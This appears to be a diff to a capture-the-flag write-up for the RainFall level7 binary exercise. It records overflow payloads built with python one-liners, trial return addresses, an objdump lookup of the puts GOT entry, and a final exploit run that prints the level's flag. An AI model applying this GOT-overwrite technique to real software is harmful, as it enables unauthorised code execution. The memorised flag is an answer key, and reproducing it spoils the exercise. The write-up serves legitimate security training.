@@ -65,24 +65,27 @@ $2 = (void *) 0xbffff710
 ```
 ./level7 `(python -c 'print ("A" * 20 + "\return address main")')` `(python -c 'print ("\xf4\x84\x04\x08" * 16)')`
 ```
+
 try1 with `0xbffff710`
 
 ```
 ./level7 `(python -c 'print ("A" * 20 + "\x10\xf7\xff\xbf")')` `(python -c 'print ("\xf4\x84\x04\x08" * 16)')`
 ```
+
 `* 152` = valide
 `* 153` = segfault
 
------------------------------------------------------------
+---
 
 try 2 with `0xbffff70f` (0xbffff710 - 1 ) == `\x0f\xf7\xff\xbf`
 
 ```
 ./level7 `(python -c 'print ("A" * 20 + "\x0f\xf7\xff\xbf")')` `(python -c 'print ("\xf4\x84\x04\x08" * 1)')`
 ```
+
 `* 1` = segfault
 
------------------------------------------------------------------
+---
 
 try 2 with `0xbffff70e` (0xbffff710 - 2 ) == `\x0f\xf7\xff\xbf`
 
@@ -90,11 +93,21 @@ try 2 with `0xbffff70e` (0xbffff710 - 2 ) == `\x0f\xf7\xff\xbf`
 ./level7 `(python -c 'print ("A" * 20 + "\x0f\xf7\xff\xbf")')` `(python -c 'print ("\xf4\x84\x04\x08" * 2)')`
 ```
 
-
 <!-- ```
 ./level7 `(python -c 'print ("A" * 20 + "\xe0\x27\xe9\xb7")')` `(python -c 'print ("\xf4\x84\x04\x08")')`
 ```
 
 ./level7 `(python -c 'print ("A" * 20 + "\x00\x84\x04\x08")')` `(python -c 'print ("\xf4\x84\x04\x08")')` -->
 
-Lets tr
+Address of puts in the GOT
+
+```
+level7@RainFall:~$ objdump -R level7 | grep puts
+08049928 R_386_JUMP_SLOT   puts
+```
+`08049928` == `\x28\x99\x04\x08`
+
+```
+./level7 `(python -c 'print ("A" * 20 + "\x28\x99\x04\x08")')` `(python -c 'print ("\xf4\x84\x04\x08")')`
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+```
